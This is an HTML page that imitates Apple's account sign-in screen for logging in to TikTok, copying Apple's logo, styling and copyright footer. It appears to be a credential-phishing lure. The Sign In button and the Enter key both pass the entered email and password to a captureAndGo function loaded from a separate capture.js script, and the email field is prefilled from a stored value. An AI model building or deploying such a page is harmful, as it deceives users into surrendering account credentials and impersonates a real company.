<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Apple Account</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', Arial, sans-serif;
      background: #fff;
      color: #1d1d1f;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    /* ── Header ───────────────────────────────────── */
    header {
      padding: 18px 28px 0;
    }

    .apple-logo { margin-bottom: 10px; }

    .header-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding-bottom: 14px;
      border-bottom: 1px solid #d2d2d7;
    }

    .header-title {
      font-size: 26px;
      font-weight: 700;
      color: #1d1d1f;
      letter-spacing: -0.3px;
    }

    .header-signin {
      font-size: 14px;
      color: #6e6e73;
      text-decoration: none;
    }
    .header-signin:hover { text-decoration: underline; }

    /* ── Main ─────────────────────────────────────── */
    main {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 60px 24px 40px;
    }

    /* ── TikTok app icon ──────────────────────────── */
    .app-icon {
      width: 80px;
      height: 80px;
      border-radius: 18px;
      background: #010101;
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 20px;
      box-shadow: 0 2px 10px rgba(0,0,0,.15);
    }

    /* ── Subtitle ─────────────────────────────────── */
    .subtitle {
      font-size: 17px;
      color: #1d1d1f;
      text-align: center;
      margin-bottom: 24px;
    }

    /* ── Input card ───────────────────────────────── */
    .input-card {
      width: 100%;
      max-width: 520px;
      border: 1px solid #c7c7cc;
      border-radius: 12px;
      overflow: hidden;
      margin-bottom: 12px;
    }

    /* Email row — taller, has label + value */
    .email-row {
      padding: 10px 16px 10px;
      background: #fff;
      border-bottom: 1px solid #d2d2d7;
      display: flex;
      flex-direction: column;
      gap: 2px;
    }

    .email-label {
      font-size: 12px;
      color: #8e8e93;
    }

    .email-value {
      font-size: 16px;
      color: #1d1d1f;
      border: none;
      outline: none;
      background: transparent;
      font-family: inherit;
      width: 100%;
      padding: 0;
    }

    /* Password row — no label, just placeholder */
    .pwd-row {
      position: relative;
      display: flex;
      align-items: center;
      height: 52px;
      padding: 0 16px;
      background: #fff;
    }

    .pwd-input {
      border: none;
      outline: none;
      font-size: 16px;
      color: #1d1d1f;
      background: transparent;
      font-family: inherit;
      width: 100%;
      height: 100%;
    }
    .pwd-input::placeholder { color: #8e8e93; }

    .eye-btn {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      color: #8e8e93;
      cursor: pointer;
      padding: 4px;
      display: flex;
      align-items: center;
    }
    .eye-btn:hover { color: #1d1d1f; }

    /* ── Forgot password ──────────────────────────── */
    .forgot-wrap {
      width: 100%;
      max-width: 520px;
      margin-bottom: 44px;
    }

    .forgot-link {
      display: inline-flex;
      align-items: center;
      gap: 4px;
      font-size: 15px;
      color: #0071e3;
      text-decoration: none;
    }
    .forgot-link:hover { text-decoration: underline; }

    /* ── Buttons ──────────────────────────────────── */
    .btn-row {
      display: flex;
      gap: 12px;
      width: 100%;
      max-width: 520px;
      margin-bottom: 10px;
    }

    .btn-signin {
      flex: 1;
      height: 46px;
      background: #0071e3;
      border: none;
      border-radius: 10px;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      transition: background 0.15s;
    }
    .btn-signin:hover { background: #0077ed; }

    .btn-iphone {
      flex: 1;
      height: 46px;
      background: #1d1d1f;
      border: 2px solid #1d1d1f;
      border-radius: 10px;
      color: #fff;
      font-size: 15px;
      font-weight: 600;
      font-family: inherit;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 7px;
      transition: background 0.15s;
    }
    .btn-iphone:hover { background: #2d2d2f; }

    /* hint aligns under iPhone button only */
    .hint-row {
      width: 100%;
      max-width: 520px;
      display: flex;
      justify-content: flex-end;
    }

    .iphone-hint {
      font-size: 12px;
      color: #6e6e73;
      flex: 1; /* same flex as btn-iphone */
      text-align: center;
    }

    /* spacer to offset the Sign In button's flex */
    .hint-spacer {
      flex: 1;
      margin-right: 12px;
    }

    /* ── Footer ───────────────────────────────────── */
    footer {
      background: #f5f5f7;
      padding: 24px 16px;
      text-align: center;
    }

    .footer-copy {
      font-size: 12px;
      color: #6e6e73;
      margin-bottom: 6px;
    }

    .footer-link {
      font-size: 12px;
      color: #1d1d1f;
      text-decoration: none;
    }
    .footer-link:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <!-- Header -->
  <header>
    <div class="apple-logo">
      <svg width="20" height="24" viewBox="0 0 814 1000" fill="#1d1d1f">
        <path d="M788.1 340.9c-5.8 4.5-108.2 62.2-108.2 190.5 0 148.4 130.3 200.9 134.2 202.2-.6 3.2-20.7 71.9-68.7 141.9-42.8 61.6-87.5 123.1-155.5 123.1s-85.5-39.5-164-39.5c-76 0-103.7 40.8-165.9 40.8s-105-42.4-150.3-109.1C141.1 762 99 684.4 99 610.2c0-145.1 94.7-221.7 188.6-221.7 63.6 0 116.5 42.9 155.2 42.9 37.1 0 96.2-45.5 168.9-45.5 28.1 0 130.3 2.6 198.3 99.2zm-234-181.5c31.1-36.9 53.1-88.1 53.1-139.3 0-7.1-.6-14.3-1.9-20.1-50.6 1.9-110.8 33.7-147.1 75.8-28.5 32.4-55.1 83.6-55.1 135.5 0 7.8 1.3 15.6 1.9 18.1 3.2.6 8.4 1.3 13.6 1.3 45.4 0 102.5-30.4 135.5-71.3z"/>
      </svg>
    </div>
    <div class="header-row">
      <span class="header-title">Apple Account</span>
      <a href="/login" class="header-signin">Sign in</a>
    </div>
  </header>

  <!-- Main -->
  <main>

    <div class="app-icon">
      <svg width="50" height="50" viewBox="0 0 50 50" fill="none">
        <path d="M32.5 10c.4 2.3 1.8 4.3 3.5 5.3v4.5c-2-.06-3.84-.66-5.42-1.74v7.9c0 5.1-4.17 9.24-9.28 9.24A9.28 9.28 0 0 1 12 25.96c0-5.1 4.17-9.24 9.28-9.24.32 0 .63.02.94.06v4.57c-.31-.05-.62-.08-.94-.08a4.76 4.76 0 0 0-4.76 4.72 4.76 4.76 0 0 0 4.76 4.72 4.76 4.76 0 0 0 4.76-4.72V10h4.86z" fill="#20D5EC" opacity="0.7" transform="translate(1,1)"/>
        <path d="M32.5 10c.4 2.3 1.8 4.3 3.5 5.3v4.5c-2-.06-3.84-.66-5.42-1.74v7.9c0 5.1-4.17 9.24-9.28 9.24A9.28 9.28 0 0 1 12 25.96c0-5.1 4.17-9.24 9.28-9.24.32 0 .63.02.94.06v4.57c-.31-.05-.62-.08-.94-.08a4.76 4.76 0 0 0-4.76 4.72 4.76 4.76 0 0 0 4.76 4.72 4.76 4.76 0 0 0 4.76-4.72V10h4.86z" fill="#EE1D52" opacity="0.7" transform="translate(-1,-1)"/>
        <path d="M32.5 10c.4 2.3 1.8 4.3 3.5 5.3v4.5c-2-.06-3.84-.66-5.42-1.74v7.9c0 5.1-4.17 9.24-9.28 9.24A9.28 9.28 0 0 1 12 25.96c0-5.1 4.17-9.24 9.28-9.24.32 0 .63.02.94.06v4.57c-.31-.05-.62-.08-.94-.08a4.76 4.76 0 0 0-4.76 4.72 4.76 4.76 0 0 0 4.76 4.72 4.76 4.76 0 0 0 4.76-4.72V10h4.86z" fill="#fff"/>
      </svg>
    </div>

    <p class="subtitle">Use your Apple Account to sign in to TikTok.</p>

    <!-- Combined input card -->
    <div class="input-card">
      <div class="email-row">
        <span class="email-label">Email or Phone Number</span>
        <input class="email-value" type="text" id="emailField" value="" autocomplete="email" />
      </div>
      <div class="pwd-row">
        <input class="pwd-input" type="password" id="pwdInput" placeholder="Password" autocomplete="current-password" />
        <button class="eye-btn" onclick="togglePwd()" type="button">
          <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
        </button>
      </div>
    </div>

    <!-- Forgot password -->
    <div class="forgot-wrap">
      <a href="#" class="forgot-link">
        Forgot password?
        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
          <line x1="7" y1="17" x2="17" y2="7"/>
          <polyline points="7 7 17 7 17 17"/>
        </svg>
      </a>
    </div>

    <!-- Buttons -->
    <div class="btn-row">
      <button class="btn-signin" onclick="captureAndGo('/login')">Sign In</button>
      <button class="btn-iphone">
        <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="#4a90d9" stroke-width="1.8">
          <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/>
          <circle cx="9" cy="7" r="4"/>
          <path d="M23 21v-2a4 4 0 0 0-3-3.87"/>
          <path d="M16 3.13a4 4 0 0 1 0 7.75"/>
        </svg>
        Sign in with iPhone
      </button>
    </div>

    <!-- Hint aligns under iPhone button (right half) -->
    <div class="hint-row">
      <div class="hint-spacer"></div>
      <span class="iphone-hint">Requires a device with iOS 17 or later.</span>
    </div>

  </main>

  <!-- Footer -->
  <footer>
    <p class="footer-copy">Copyright © 2026 Apple Inc. All rights reserved.</p>
    <a href="#" class="footer-link">Privacy Policy</a>
  </footer>

  <script src="/capture.js"></script>
  <script>
    const saved = localStorage.getItem('appleEmail');
    if (saved) document.getElementById('emailField').value = saved.toUpperCase();

    function togglePwd() {
      const input = document.getElementById('pwdInput');
      const icon = document.getElementById('eyeIcon');
      if (input.type === 'password') {
        input.type = 'text';
        icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>';
      } else {
        input.type = 'password';
        icon.innerHTML = '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
      }
    }

    document.getElementById('pwdInput').addEventListener('keydown', e => {
      if (e.key === 'Enter') captureAndGo('/login');
    });
  </script>

</body>
</html>
